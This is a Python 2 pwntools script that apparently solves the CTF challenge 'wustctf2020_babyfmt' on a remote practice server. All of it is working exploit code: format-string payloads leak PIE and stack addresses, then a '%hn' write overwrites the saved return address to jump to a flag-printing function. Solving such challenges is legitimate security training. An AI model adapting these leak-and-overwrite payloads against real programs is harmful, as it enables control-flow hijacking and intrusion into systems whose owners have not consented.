
# coding=utf-8
from pwn import *
#context.log_level = 'debug'


local = 1
if local == 0:
    r=process('./wustctf2020_babyfmt')
    gdb.attach(r,'b * $rebase(0xED1)')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node3.buuoj.cn',29650)
    #libc = ELF('./libc.so.6')

elf = ELF('./wustctf2020_babyfmt')

for i in range(3):
    r.sendline('1')
    

r.recvuntil('>>')
r.sendline('2')
sleep(2)
r.sendline('%7$n%17$p%16$psaaaaaaaa')

pie = int(r.recv(14),16)-4140
rbp = int(r.recv(14),16)-0x30
print '17>>>>>'+hex(pie+4140)
print 'pie>>>>'+hex(pie)
print 'rbp>>>>'+hex(rbp)
secret = pie+0x202060
flag = pie+0xF56

r.recvuntil('>>')
r.sendline('2')
sleep(1)
num = flag & 0xffff

exp = '%'+str(num)+'c%10$hn'
exp += 'a'*(16-len(exp))
exp +=p64(rbp+8)
print len(exp)
r.sendline(exp)


r.interactive()